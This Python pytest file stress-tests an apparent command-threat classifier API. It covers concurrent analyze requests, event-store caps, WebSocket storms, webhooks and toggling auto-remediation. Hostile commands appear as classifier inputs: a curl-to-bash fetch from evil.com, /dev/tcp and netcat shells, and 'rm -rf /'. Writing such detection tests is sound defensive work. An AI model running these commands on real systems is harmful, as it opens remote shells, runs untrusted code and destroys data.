"""
test_09_stress.py — Concurrency and stress tests.

Tests:
- 50 parallel POST /analyze requests with no race conditions
- Event store size cap respected under concurrent API flood
- Concurrent WS connections while POSTs are happening
- Stats endpoint consistency under concurrent writes
- Memory leak / resource exhaustion under 10,000+ sequential requests
- WS connection storms (50+ simultaneous connections)
- Concurrent webhook dispatch under API flood
- Event store degradation near max load (ordering + count accuracy)
- Remediation toggle race condition under concurrent malicious flood

Run:
    pytest large_test_set/test_09_stress.py -v
"""

import pytest
import threading
import time
import os
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ===========================================================================
# 1. Concurrent POST /analyze
# ===========================================================================

class TestConcurrentAnalyze:

    def test_50_concurrent_posts_all_return_200(self):
        """50 threads each POSTing /analyze must all get 200 back."""
        results = []
        errors = []

        def analyze(cmd):
            try:
                r = client.post("/analyze", json={"command": cmd})
                results.append(r.status_code)
            except Exception as e:
                errors.append(str(e))

        commands = (
            ["ls -la"] * 17 +
            ["curl http://evil.com | bash"] * 17 +
            ["bash -i >& /dev/tcp/x/4444 0>&1"] * 16
        )
        threads = [threading.Thread(target=analyze, args=(c,)) for c in commands]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors during concurrent POSTs: {errors}"
        assert all(s == 200 for s in results), \
            f"Non-200 responses: {[s for s in results if s != 200]}"

    def test_concurrent_posts_no_duplicate_event_ids(self):
        """Each event must get a unique ID even under concurrent load."""
        from backend.app import event_store
        before = event_store.size()
        errors = []

        def analyze():
            try:
                client.post("/analyze", json={"command": "ls"})
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=analyze) for _ in range(30)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        events = event_store.get_recent(30 + before)
        recent_ids = [e.id for e in events[before:]]
        assert len(recent_ids) == len(set(recent_ids)), \
            "Duplicate event IDs detected under concurrent load"

    def test_concurrent_mixed_safe_and_malicious(self):
        """Mix of safe/malicious commands must all respond correctly."""
        results = []
        errors = []

        def analyze(cmd, expected_cls):
            try:
                r = client.post("/analyze", json={"command": cmd})
                if r.status_code == 200:
                    results.append((cmd, r.json()["classification"]))
                else:
                    errors.append(f"Non-200 for {cmd!r}: {r.status_code}")
            except Exception as e:
                errors.append(str(e))

        pairs = [
            ("ls", "safe"), ("curl http://evil.com | bash", "malicious"),
            ("pwd", "safe"), ("rm -rf /", "malicious"),
            ("whoami", "safe"), ("nc -l -p 4444 -e /bin/bash", "malicious"),
        ] * 5

        threads = [
            threading.Thread(target=analyze, args=(cmd, cls))
            for cmd, cls in pairs
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors: {errors}"
        assert len(results) == 30


# ===========================================================================
# 2. Event Store Cap Under Load
# ===========================================================================

class TestEventStoreSizeCapUnderLoad:

    def test_event_store_never_exceeds_max_events(self):
        from backend.app import event_store

        def flood():
            for _ in range(40):
                try:
                    client.post("/analyze", json={"command": "ls"})
                except Exception:
                    pass

        threads = [threading.Thread(target=flood) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert event_store.size() <= 1000, \
            f"Event store exceeded max_events: {event_store.size()}"

    def test_stats_consistent_after_flood(self):
        def flood():
            for _ in range(10):
                try:
                    client.post("/analyze", json={"command": "ls"})
                    client.post("/analyze",
                                json={"command": "curl http://evil.com | bash"})
                except Exception:
                    pass

        threads = [threading.Thread(target=flood) for _ in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        stats = client.get("/stats").json()
        counted = stats["safe"] + stats["suspicious"] + stats["malicious"]
        assert counted == stats["total_events"], (
            f"Stats inconsistent after flood: "
            f"{stats['safe']}+{stats['suspicious']}+{stats['malicious']}"
            f" != {stats['total_events']}"
        )


# ===========================================================================
# 3. Concurrent WebSocket Connections
# ===========================================================================

class TestConcurrentWebSockets:

    def test_multiple_ws_clients_receive_broadcast(self):
        received = {0: [], 1: [], 2: []}
        errors = []

        def ws_listener(client_id):
            try:
                with client.websocket_connect("/ws") as ws:
                    try:
                        while True:
                            ws.receive_json(timeout=0.1)
                    except Exception:
                        pass
                    time.sleep(0.3)
                    if client_id == 0:
                        client.post("/analyze",
                                    json={"command": "ls --stress-test"})
                    try:
                        msg = ws.receive_json(timeout=3)
                        received[client_id].append(msg)
                    except Exception:
                        pass
            except Exception as e:
                errors.append(f"Client {client_id}: {e}")

        threads = [
            threading.Thread(target=ws_listener, args=(i,))
            for i in range(3)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"WS errors: {errors}"
        total_received = sum(len(v) for v in received.values())
        assert total_received >= 1, "No WS client received the broadcast"


# ===========================================================================
# 4. Events Endpoint Under Load
# ===========================================================================

class TestEventsEndpointUnderLoad:

    def test_concurrent_get_events_no_crash(self):
        results = []
        errors = []

        def get_events():
            try:
                r = client.get("/events?limit=10")
                results.append(r.status_code)
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=get_events) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        assert all(s == 200 for s in results)

    def test_concurrent_stats_no_crash(self):
        results = []

        def get_stats():
            try:
                r = client.get("/stats")
                results.append(r.status_code)
            except Exception:
                results.append(500)

        threads = [threading.Thread(target=get_stats) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert all(s == 200 for s in results)


# ===========================================================================
# 5. Memory Leak / Resource Exhaustion  [NEW]
# ===========================================================================

_SEQ_REQUESTS = int(os.environ.get("STRESS_SEQ_REQUESTS", "10000"))


class TestMemoryAndResourceExhaustion:

    def test_10k_sequential_posts_all_return_200(self):
        errors = []
        for i in range(_SEQ_REQUESTS):
            try:
                r = client.post("/analyze", json={"command": "ls"})
                if r.status_code != 200:
                    errors.append(f"Request {i}: status {r.status_code}")
            except Exception as e:
                errors.append(f"Request {i}: {e}")
            if errors:
                break
        assert errors == [], f"Resource exhaustion detected: {errors}"

    def test_sequential_posts_event_store_size_stays_bounded(self):
        from backend.app import event_store
        batch = min(_SEQ_REQUESTS, 2000)
        for _ in range(batch):
            try:
                client.post("/analyze", json={"command": "ls"})
            except Exception:
                pass
        assert event_store.size() <= 1000, \
            f"Event store grew beyond cap: {event_store.size()}"

    def test_sequential_posts_stats_remain_consistent(self):
        batch = min(_SEQ_REQUESTS, 500)
        for _ in range(batch):
            try:
                client.post("/analyze", json={"command": "ls"})
            except Exception:
                pass
        stats = client.get("/stats").json()
        counted = stats["safe"] + stats["suspicious"] + stats["malicious"]
        assert counted == stats["total_events"], \
            f"Stats drifted under sequential load: {stats}"

    def test_sequential_get_events_no_memory_growth(self):
        errors = []
        for i in range(min(_SEQ_REQUESTS // 10, 1000)):
            try:
                r = client.get("/events?limit=50")
                if r.status_code != 200:
                    errors.append(f"Request {i}: status {r.status_code}")
            except Exception as e:
                errors.append(f"Request {i}: {e}")
            if errors:
                break
        assert errors == [], f"GET /events degraded: {errors}"

    def test_sequential_healthz_never_fails(self):
        errors = []
        for i in range(1000):
            try:
                r = client.get("/healthz")
                if r.status_code != 200:
                    errors.append(f"Probe {i}: status {r.status_code}")
            except Exception as e:
                errors.append(f"Probe {i}: {e}")
            if errors:
                break
        assert errors == [], f"/healthz failed under load: {errors}"


# ===========================================================================
# 6. WebSocket Connection Storm  [NEW]
# ===========================================================================

_WS_STORM_SIZE = 50


class TestWebSocketConnectionStorm:

    def test_50_simultaneous_ws_connections_no_server_crash(self):
        pong_received = []
        errors = []
        lock = threading.Lock()

        def connect_and_ping(client_id):
            try:
                with client.websocket_connect("/ws") as ws:
                    ws.send_text("ping")
                    resp = ws.receive_text(timeout=5)
                    with lock:
                        if resp == "pong":
                            pong_received.append(client_id)
                        else:
                            errors.append(f"Client {client_id}: unexpected {resp!r}")
            except Exception as e:
                with lock:
                    errors.append(f"Client {client_id}: {e}")

        threads = [
            threading.Thread(target=connect_and_ping, args=(i,))
            for i in range(_WS_STORM_SIZE)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors during WS storm: {errors}"
        assert len(pong_received) == _WS_STORM_SIZE, \
            f"Only {len(pong_received)}/{_WS_STORM_SIZE} clients received pong"

    def test_50_ws_connections_all_receive_broadcast(self):
        received = []
        errors = []
        lock = threading.Lock()

        def connect_and_wait(client_id):
            try:
                with client.websocket_connect("/ws") as ws:
                    try:
                        while True:
                            ws.receive_json(timeout=0.05)
                    except Exception:
                        pass
                    try:
                        msg = ws.receive_json(timeout=5)
                        with lock:
                            received.append(client_id)
                    except Exception:
                        pass
            except Exception as e:
                with lock:
                    errors.append(f"Client {client_id}: {e}")

        threads = [
            threading.Thread(target=connect_and_wait, args=(i,))
            for i in range(_WS_STORM_SIZE)
        ]
        for t in threads:
            t.start()

        time.sleep(1.0)
        client.post("/analyze", json={"command": "ls --ws-storm-broadcast"})

        for t in threads:
            t.join()

        assert errors == [], f"Connection errors during WS storm: {errors}"
        delivery_rate = len(received) / _WS_STORM_SIZE
        assert delivery_rate >= 0.8, (
            f"Broadcast delivery rate too low: "
            f"{len(received)}/{_WS_STORM_SIZE} ({delivery_rate:.0%})"
        )

    def test_server_stable_after_ws_storm_subsides(self):
        def connect_and_close():
            try:
                with client.websocket_connect("/ws"):
                    pass
            except Exception:
                pass

        storm = [threading.Thread(target=connect_and_close)
                 for _ in range(_WS_STORM_SIZE)]
        for t in storm:
            t.start()
        for t in storm:
            t.join()

        time.sleep(0.5)
        assert client.post("/analyze", json={"command": "ls --post-storm"}).status_code == 200
        with client.websocket_connect("/ws") as ws:
            ws.send_text("ping")
            assert ws.receive_text(timeout=3) == "pong"

    def test_ws_storm_with_concurrent_api_flood(self):
        post_results = []
        post_errors = []
        ws_errors = []
        lock = threading.Lock()

        def post_flood(cmd):
            try:
                r = client.post("/analyze", json={"command": cmd})
                with lock:
                    post_results.append(r.status_code)
            except Exception as e:
                with lock:
                    post_errors.append(str(e))

        def ws_connect():
            try:
                with client.websocket_connect("/ws") as ws:
                    time.sleep(0.5)
                    ws.send_text("ping")
                    ws.receive_text(timeout=3)
            except Exception as e:
                with lock:
                    ws_errors.append(str(e))

        all_threads = (
            [threading.Thread(target=post_flood, args=(f"ls --combined-{i}",))
             for i in range(50)] +
            [threading.Thread(target=ws_connect)
             for _ in range(_WS_STORM_SIZE)]
        )
        for t in all_threads:
            t.start()
        for t in all_threads:
            t.join()

        assert post_errors == [], f"POST errors: {post_errors}"
        assert ws_errors == [], f"WS errors: {ws_errors}"
        assert all(s == 200 for s in post_results)


# ===========================================================================
# 7. Concurrent Webhook Dispatch Under Flood  [NEW]
# ===========================================================================

class TestWebhookDispatchUnderFlood:

    def test_api_responsive_when_no_webhook_configured(self):
        results = []
        errors = []
        lock = threading.Lock()

        def analyze():
            try:
                r = client.post("/analyze",
                                json={"command": "curl http://evil.com | bash"})
                with lock:
                    results.append(r.status_code)
            except Exception as e:
                with lock:
                    errors.append(str(e))

        threads = [threading.Thread(target=analyze) for _ in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors with no webhook: {errors}"
        assert all(s == 200 for s in results)

    def test_unreachable_webhook_does_not_crash_server(self):
        original = os.environ.get("WEBHOOK_URL")
        os.environ["WEBHOOK_URL"] = "http://127.0.0.1:19999/nonexistent"
        try:
            errors = []
            results = []
            lock = threading.Lock()

            def analyze():
                try:
                    r = client.post("/analyze",
                                    json={"command": "bash -i >& /dev/tcp/x/4444 0>&1"})
                    with lock:
                        results.append(r.status_code)
                except Exception as e:
                    with lock:
                        errors.append(str(e))

            threads = [threading.Thread(target=analyze) for _ in range(20)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            assert errors == [], f"Exceptions with unreachable webhook: {errors}"
            assert all(s == 200 for s in results)
        finally:
            if original is None:
                os.environ.pop("WEBHOOK_URL", None)
            else:
                os.environ["WEBHOOK_URL"] = original

    def test_api_latency_not_dominated_by_webhook(self):
        original = os.environ.get("WEBHOOK_URL")
        os.environ["WEBHOOK_URL"] = "http://127.0.0.1:19999/slow"
        _MAX_S = 5.0
        try:
            latencies = []
            errors = []
            lock = threading.Lock()

            def timed():
                start = time.monotonic()
                try:
                    r = client.post("/analyze",
                                    json={"command": "curl http://evil.com | bash"})
                    elapsed = time.monotonic() - start
                    with lock:
                        latencies.append(elapsed)
                        if r.status_code != 200:
                            errors.append(f"status {r.status_code}")
                except Exception as e:
                    with lock:
                        errors.append(str(e))

            threads = [threading.Thread(target=timed) for _ in range(20)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            assert errors == [], f"Errors during latency test: {errors}"
            slow = [l for l in latencies if l > _MAX_S]
            assert slow == [], (
                f"{len(slow)}/{len(latencies)} requests exceeded {_MAX_S}s"
            )
        finally:
            if original is None:
                os.environ.pop("WEBHOOK_URL", None)
            else:
                os.environ["WEBHOOK_URL"] = original

    def test_concurrent_flood_with_webhook_all_events_stored(self):
        from backend.app import event_store
        size_before = event_store.size()
        n = 30
        errors = []
        lock = threading.Lock()

        def analyze(i):
            try:
                client.post("/analyze", json={"command": f"ls --webhook-flood-{i}"})
            except Exception as e:
                with lock:
                    errors.append(str(e))

        threads = [threading.Thread(target=analyze, args=(i,)) for i in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        assert event_store.size() >= min(size_before + n, 1000)


# ===========================================================================
# 8. Event Store Degradation Under Max Load  [NEW]
# ===========================================================================

_STORE_CAP = 1000


class TestEventStoreDegradationNearCap:

    def _flood_to_near_cap(self, target=980):
        from backend.app import event_store
        needed = max(0, target - event_store.size())
        for _ in range(needed):
            client.post("/analyze", json={"command": "ls"})

    def test_size_matches_get_recent_length_near_cap(self):
        from backend.app import event_store
        self._flood_to_near_cap(target=950)
        size = event_store.size()
        assert len(event_store.get_recent(size)) == size

    def test_most_recent_events_retained_after_cap_overflow(self):
        from backend.app import event_store
        self._flood_to_near_cap(target=_STORE_CAP)
        for _ in range(20):
            client.post("/analyze", json={"command": "ls --overflow-filler"})
        client.post("/analyze", json={"command": "ls --ordering-sentinel"})
        recent = event_store.get_recent(_STORE_CAP)
        assert "ls --ordering-sentinel" in [e.command for e in recent], \
            "Most recently added event was evicted — store retaining old events"

    def test_oldest_events_evicted_not_newest(self):
        from backend.app import event_store
        client.post("/analyze", json={"command": "ls --eviction-canary"})
        for _ in range(_STORE_CAP + 10):
            client.post("/analyze", json={"command": "ls --eviction-filler"})
        recent = event_store.get_recent(_STORE_CAP)
        assert "ls --eviction-canary" not in [e.command for e in recent], \
            "Old canary event still present — store may be growing unboundedly"

    def test_concurrent_writes_near_cap_no_count_drift(self):
        from backend.app import event_store
        self._flood_to_near_cap(target=990)
        errors = []
        lock = threading.Lock()

        def write_burst():
            for _ in range(20):
                try:
                    client.post("/analyze", json={"command": "ls"})
                except Exception as e:
                    with lock:
                        errors.append(str(e))

        threads = [threading.Thread(target=write_burst) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        final = event_store.size()
        assert 0 < final <= _STORE_CAP, f"Invalid store size near cap: {final}"

    def test_concurrent_writes_near_cap_get_recent_consistent(self):
        from backend.app import event_store
        self._flood_to_near_cap(target=990)

        def write_burst():
            for _ in range(15):
                try:
                    client.post("/analyze", json={"command": "ls"})
                except Exception:
                    pass

        threads = [threading.Thread(target=write_burst) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        events = event_store.get_recent(_STORE_CAP)
        assert len(events) > 0
        corrupt = [i for i, e in enumerate(events)
                   if e is None or not hasattr(e, "id") or e.id is None]
        assert corrupt == [], f"Corrupt events at indices {corrupt}"

    def test_size_and_get_recent_agree_under_concurrent_reads_and_writes(self):
        from backend.app import event_store
        self._flood_to_near_cap(target=900)
        inconsistencies = []
        lock = threading.Lock()
        stop_flag = threading.Event()

        def writer():
            while not stop_flag.is_set():
                try:
                    client.post("/analyze", json={"command": "ls"})
                except Exception:
                    pass

        def reader():
            while not stop_flag.is_set():
                try:
                    s = event_store.size()
                    ev = event_store.get_recent(s)
                    if len(ev) > s:
                        with lock:
                            inconsistencies.append(f"size={s} but got {len(ev)}")
                except Exception:
                    pass

        all_threads = (
            [threading.Thread(target=writer) for _ in range(5)] +
            [threading.Thread(target=reader) for _ in range(5)]
        )
        for t in all_threads:
            t.start()
        time.sleep(2.0)
        stop_flag.set()
        for t in all_threads:
            t.join()

        assert inconsistencies == [], f"Read/write inconsistency: {inconsistencies[:5]}"


# ===========================================================================
# 9. Remediation Toggle Race Condition Under Malicious Flood  [NEW]
# Enabling/disabling auto-remediation while 50 threads post malicious
# commands must not cause crashes, panics, or status inconsistencies.
# ===========================================================================

class TestRemediationToggleRaceCondition:

    def test_toggle_during_malicious_flood_no_crash(self):
        """Rapidly toggling remediation ON/OFF while 50 threads post
        malicious commands must not raise any exceptions."""
        post_errors = []
        toggle_errors = []
        lock = threading.Lock()
        stop_flag = threading.Event()

        def flood():
            while not stop_flag.is_set():
                try:
                    client.post("/analyze",
                                json={"command": "bash -i >& /dev/tcp/x/4444 0>&1"})
                except Exception as e:
                    with lock:
                        post_errors.append(str(e))

        def toggler():
            for enabled in ([True, False] * 25):
                try:
                    client.post("/settings/remediation", json={"enabled": enabled})
                    time.sleep(0.01)
                except Exception as e:
                    with lock:
                        toggle_errors.append(str(e))

        flood_threads = [threading.Thread(target=flood) for _ in range(20)]
        toggle_thread = threading.Thread(target=toggler)

        for t in flood_threads:
            t.start()
        toggle_thread.start()

        toggle_thread.join()
        stop_flag.set()
        for t in flood_threads:
            t.join()

        assert post_errors == [], f"POST errors during toggle flood: {post_errors}"
        assert toggle_errors == [], f"Toggle errors: {toggle_errors}"

    def test_remediation_state_consistent_after_toggle_flood(self):
        """After rapid toggling, the remediation state must settle to a
        known value and be readable without error."""
        # Turn off after the test to leave a clean state
        for enabled in [True, False] * 10:
            client.post("/settings/remediation", json={"enabled": enabled})

        client.post("/settings/remediation", json={"enabled": False})
        r = client.get("/settings/remediation")
        assert r.status_code == 200
        assert r.json()["enabled"] is False

    def test_malicious_events_all_stored_regardless_of_toggle(self):
        """Events must be stored even when remediation is being toggled
        concurrently — remediation affects process killing, not storage."""
        from backend.app import event_store
        size_before = event_store.size()
        n_posts = 20
        errors = []
        lock = threading.Lock()

        def post_malicious(i):
            try:
                client.post("/analyze",
                            json={"command": f"rm -rf / --toggle-test-{i}"})
            except Exception as e:
                with lock:
                    errors.append(str(e))

        def toggle():
            for enabled in [True, False] * 5:
                try:
                    client.post("/settings/remediation", json={"enabled": enabled})
                    time.sleep(0.005)
                except Exception:
                    pass

        threads = (
            [threading.Thread(target=post_malicious, args=(i,))
             for i in range(n_posts)] +
            [threading.Thread(target=toggle)]
        )
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Cleanup
        client.post("/settings/remediation", json={"enabled": False})

        assert errors == []
        size_after = event_store.size()
        assert size_after >= min(size_before + n_posts, _STORE_CAP), (
            f"Not all malicious events stored during toggle. "
            f"Before: {size_before}, after: {size_after}, sent: {n_posts}"
        )